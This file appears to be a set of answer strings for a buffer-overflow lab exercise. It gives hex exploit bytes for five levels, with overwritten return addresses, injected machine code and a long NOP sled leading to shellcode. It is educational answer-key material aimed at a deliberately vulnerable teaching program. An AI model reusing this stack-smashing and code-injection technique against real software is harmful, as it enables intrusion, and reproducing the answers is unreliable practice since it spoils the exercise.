/* Level 0 
31 32 33 34 35 36 37 38
39 00 68 55 f4 2f 2c 00
38 c4 04 08 ff ff ff ff
f0 36 68 55 10 c4 17 00 
f0 36 68 55 9b 91 04 08
*/

/* Level 1
31 32 33 34 35 36 37 38
39 00 68 55 f4 2f 2c 00
38 c4 04 08 ff ff ff ff
f0 36 68 55 10 c4 17 00
f0 36 68 55 50 91 04 08

00 00 00 00

03 61 89 5b
*/

/* Level 2
a1 18 b3 04 08
a3 24 b3 04 08
68 03 91 04 08
c3

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

f0 36 68 55 b0 36 68 55
*/

/* Level 3
68 35 8d 04 08
68 be 8c 04 08
a1 18 b3 04 08
c3

00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

f0 36 68 55 b0 36 68 55
*/

/* Level 4 */
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90 90 90 90 90 90
90 90 90  

68 d1 8c 04 08          /* push   $0x8048cd1 */

68 a6 8c 04 08          /* push   $0x8048ca6 */

89 e5                   /* mov    %esp,%ebp */
83 c5 20                /* add    0x18,%ebp */ 

a1 18 b3 04 08          /* mov    0x804b318,%eax */
c3                      /* ret */

c8 34 68 55 d0 34 68 55

